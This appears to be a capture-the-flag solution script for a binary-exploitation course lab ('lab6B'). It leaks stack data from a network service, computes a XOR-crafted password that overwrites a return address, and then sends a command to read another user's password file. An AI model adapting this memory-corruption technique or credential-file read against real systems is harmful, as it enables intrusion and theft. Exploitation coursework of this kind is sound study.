#!/usr/bin/python
# coding: utf-8


import socket
import struct
import sys
import threading
import time


#   Observations: The binary is not suid'd. This means that if we try to run
# the binary locally, we won't get access to the secretpass.

#   Exploitation: This is a RCE based challenge. We must pwn the service
# running in port 6642 in order to get the flag.


# ******* IMPORTANT *******
# This exploit works for my particular VM configuration. These are the values
# that might change depending on your configuration:
HOST = '10.0.0.2'

# *************************

PORT = 6642


def dump(s):
    '''
    Dumps the content of +s+ in a hexadecimal format
    '''
    dmp = ''
    fmt = '%d : 0x%08x 0x%08x 0x%08x 0x%08x | %s\n'
    i = 1
    while s:
        if len(s) < 16:
            s += '\x00' * (16 - len(s))
        num = struct.unpack('IIII', s[:16])
        z = s[:16]
        sane = ''.join('.' if ord(c) < 0x20 or ord(c) > 0x7e else c for c in z)
        dmp += fmt % (i, num[0], num[1], num[2], num[3], sane)
        s = s[16:]
        i += 1

    print dmp


def handle_out(s, stuff, stage1, stage3):
    while True:
        buf = s.recv(1024)
        if not stage1.is_set():
            i = buf.find('AAA')
            if i >= 0:
                stuff['leak'] = buf[i+0x40:i+0x59]
                stage1.set()
        if not stage3.is_set():
            if buf.find('WELCOME') >= 0:
                stage3.set()
        print buf,


def get_login(leak):
    '''
    This function parses the leaked info and returns the login()
    and original return addresses.
    '''
    if len(leak) < 25:
        return None

    ret = struct.unpack('I', leak[20:24])[0]
    log = ret ^ 0x03030303  # Revert the xor process from hash_pass()
    log = ret >> 12  # Get rid of first 12 bits
    log = log << 12 | 0xaf4  # Adjust the first 12 bits to match login() offset
    return log, ret


def craft_pass(ret, log):
    '''
    Crafts the proper password for user 'A'*0x20 to change the return address
    and modify the remain attempts number.
    '''
    p = 'BBBB'
    p += '\x40BBB'  # 0x40^0x41=0x1 -> 0x1^0xfe=0xff (0xfcfcfcfe->0xffffffff)
    p += 'B'*0xc

    # Now we need to know which numbers use to xor the return address in order
    # to generate the login() address. Note that we only need to change the
    # last 12 bits
    num = (((ret ^ log) ^ 0x41414141) & 0xffff) | 0x42420000
    p += struct.pack('<I', num)
    p += 'B'*0x8
    return p


if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    stuff = {'leak': ''}  # Stuff to retreive from output
    stage1 = threading.Event()
    stage3 = threading.Event()
    reader = threading.Thread(target=handle_out,
                              args=(s, stuff, stage1, stage3))
    reader.daemon = True
    reader.start()

    # STAGE1: Trigger the leak
    s.sendall('A'*0x20+'\n'+'B'*0x20+'\n')
    stage1.wait(timeout=3)
    if not stage1.is_set():
        print '[!] STAGE1 FAILED! Please relaunch the exploit'
        sys.exit(1)

    time.sleep(0.5)
    print '\n[+] STAGE1 Completed!'
    print '[+] Leaked info:'
    dump(stuff['leak'])

    # STAGE2: Retreive login() address from leak
    log, ret = get_login(stuff['leak'])
    if log is None:
        print '[!] STAGE2 FAILED! Please relaunch the exploit'
        sys.exit(1)

    time.sleep(0.5)
    print '\n[+] STAGE2 Completed!'
    print '[+] Retreived login() address 0x%x' % log

    passw = craft_pass(log, ret)
    s.sendall('A'*0x20+'\n'+passw+'\na\na\n')
    stage3.wait(timeout=3)
    if not stage3.is_set():
        print '[!] STAGE3 FAILED! Please relaunch the exploit'
        sys.exit(1)

    time.sleep(0.1)
    print '[+] STAGE3 Completed! lab6B pwned :)'
    print 'flag :',
    s.sendall('cat /home/lab6A/.pass\n')
    time.sleep(0.1)
    raw_input('PRESS ENTER TO EXIT')
    s.close()
